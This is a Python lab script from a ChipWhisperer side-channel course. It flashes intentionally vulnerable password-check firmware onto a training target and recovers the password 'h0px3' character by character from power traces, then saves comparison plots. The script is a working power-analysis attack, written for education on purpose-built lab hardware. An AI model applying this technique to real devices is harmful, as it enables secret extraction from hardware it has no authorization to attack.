#!/usr/bin/env python3
# MIT License
#
# Copyright (c) 2026 David Reguera Garcia (aka Dreg)
# dreg@rootkit.es - https://github.com/therealdreg/abductor
#
# Disclaimer: this is the work of a hobbyist, shared in good faith for educational
# purposes. It is not professional work and may contain mistakes or inaccuracies;
# corrections and feedback are welcome. Provided "as is" and used at your own risk.
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

# sca101 Lab 2_1B, power analysis for password bypass: an SPA timing attack on basic-passwdcheck
# (password "h0px3"). Each correct character adds one loop iteration to the check, so the power
# trace diverges later the longer the correct prefix is.
# Target: CW312T-SAM4S with a ChipWhisperer Husky Plus. It sits in the straight board or the
# right-angle board (the Abductor variants, CW312-to-CW308 adapters on a CW308 UFO) or in the CW313.
# For each of the 5 positions it captures a reference trace with a wrong character, then one trace
# per candidate (a to z, 0 to 9), 3000 samples per trace, and scores every candidate with
# SAD = sum(abs(trace - ref_trace)). The correct next character is expected to give the largest SAD
# against the wrong reference. The winner extends the known prefix for the next position.
# Builds basic-passwdcheck (SS_VER_1_1) with the xpack ARM toolchain and flashes it over SAM-BA.
# Set the hard-coded paths first.
# Argument: optional setup label such as ra or cw313. It only adds a subfolder, img/<label>, to the
# output path; the plot titles name the Abductor on every setup.
# Output: the winner, its SAD, the second-best SAD and the margin for each position, the recovered
# password and whether it matches h0px3, and 2_1B_spa_divergence.png and 2_1B_attack_heatmap.png.
import os, time, subprocess
import numpy as np
import matplotlib; matplotlib.use("Agg")
import matplotlib.pyplot as plt
import chipwhisperer as cw

PLATFORM="CW312_SAM4S"; SS_VER="SS_VER_1_1"
FWDIR="/home/dreg/chipwhisperer/firmware/mcu/basic-passwdcheck"
HEX=f"{FWDIR}/basic-passwdcheck-{PLATFORM}.hex"
TC="/home/dreg/toolchains/xpack-arm-none-eabi-gcc-13.3.1-1.1/bin"
import sys, os as _os; OUT="/home/dreg/chipwhisperer/dregdoc/img"+(("/"+sys.argv[1]) if len(sys.argv)>1 else ""); _os.makedirs(OUT, exist_ok=True)
# Setup name for the plot titles, from the label: cw313, ra, or none for the straight board.
_LBL = sys.argv[1] if len(sys.argv) > 1 else ""
SETUP = ("on CW313" if "cw313" in _LBL else
         "via right-angle Abductor" if _LBL == "ra" or _LBL.startswith("ra_") or _LBL.endswith("_ra") else
         "via Abductor")
ENV=dict(os.environ, PATH=TC+":"+os.environ["PATH"])
CHARS='abcdefghijklmnopqrstuvwxyz0123456789'
SAMPLES=3000

print("=== build basic-passwdcheck ===")
subprocess.run(["make","clean"], cwd=FWDIR, env=ENV, capture_output=True)
r=subprocess.run(["make",f"PLATFORM={PLATFORM}","CRYPTO_TARGET=NONE",f"SS_VER={SS_VER}","-j"],
                 cwd=FWDIR, env=ENV, capture_output=True, text=True)
assert os.path.isfile(HEX), (r.stdout[-1500:]+r.stderr[-1500:])
print("   built", os.path.basename(HEX))

print("=== connect + program ===")
scope=cw.scope(); target=cw.target(scope, cw.targets.SimpleSerial)
scope.default_setup(); scope.adc.samples=SAMPLES
cw.program_target(scope, cw.programmers.SAM4SProgrammer, HEX)

def reset_target(scope):
    scope.io.nrst='low'; time.sleep(0.05); scope.io.nrst='high_z'; time.sleep(0.2)

# basic-passwdcheck checks one password per boot and then stops, so each guess starts with a reset.
# The boot text waiting on the serial port is read and dropped before the scope is armed.
def cap_pass_trace(pass_guess):
    reset_target(scope)
    n=target.in_waiting()
    while n>0:
        target.read(n,10); time.sleep(0.01); n=target.in_waiting()
    scope.arm()
    target.write(pass_guess)
    if scope.capture(): print("   timeout during capture")
    return scope.get_last_trace()

t=cap_pass_trace("h\n"); assert len(t)==SAMPLES
print("   sanity OK, trace len", len(t))

print("=== full SPA attack ===")
guessed=""
diffmat=np.zeros((5,len(CHARS)))
for pos in range(5):
    # Reference: the known prefix plus 0x01, which is not in CHARS, so it is wrong at this position.
    ref=cap_pass_trace(guessed+"\x01\n")
    best=(0.0,'?')
    for j,c in enumerate(CHARS):
        tr=cap_pass_trace(guessed+c+"\n")
        d=float(np.sum(np.abs(tr-ref)))
        diffmat[pos,j]=d
        if d>best[0]: best=(d,c)
    guessed+=best[1]
    runner=sorted(diffmat[pos])[-2]
    print(f"   pos {pos}: '{best[1]}'  SAD={best[0]:.1f}  (2nd best {runner:.1f}, margin x{best[0]/max(runner,1e-9):.1f})  -> {guessed}")

print("RECOVERED PASSWORD:", repr(guessed))
print("MATCH 'h0px3':", guessed=="h0px3")

# Figure 1, 2_1B_spa_divergence.png: the first 700 samples for the guesses 'h' (correct first
# character) and '0' (wrong).
th=cap_pass_trace("h\n")[:700]; t0=cap_pass_trace("0\n")[:700]
plt.figure(figsize=(13,4))
plt.plot(th, lw=0.8, label="guess 'h' (correct first char)")
plt.plot(t0, lw=0.8, label="guess '0' (wrong first char)")
plt.title(f"sca101 Lab 2_1B: SPA divergence, correct vs wrong first character (CW312T-SAM4S {SETUP} + Husky Plus)")
plt.xlabel("sample"); plt.ylabel("power (normalized)"); plt.legend(fontsize=8); plt.grid(alpha=0.3); plt.tight_layout()
plt.savefig(f"{OUT}/2_1B_spa_divergence.png", dpi=115); plt.close()

# Figure 2, 2_1B_attack_heatmap.png: the SAD of each candidate at each position, divided by the
# largest SAD at that position. The brightest cell in each position is the recovered character.
plt.figure(figsize=(13,5.2))
norm=diffmat/diffmat.max(axis=1, keepdims=True)
plt.imshow(norm.T, aspect='auto', cmap='viridis', origin='lower')
plt.yticks(range(len(CHARS)), list(CHARS), fontsize=6)
plt.xticks(range(5), [f"pos {i}\n'{guessed[i]}'" for i in range(5)])
plt.colorbar(label="normalized SAD (per position)")
plt.title(f"sca101 Lab 2_1B: per-character SAD, recovered password = '{guessed}'  (CW312T-SAM4S {SETUP} + Husky Plus)")
plt.tight_layout(); plt.savefig(f"{OUT}/2_1B_attack_heatmap.png", dpi=115); plt.close()

scope.dis(); target.dis()
print("saved:", OUT+"/2_1B_spa_divergence.png ,", OUT+"/2_1B_attack_heatmap.png"); print("DONE")
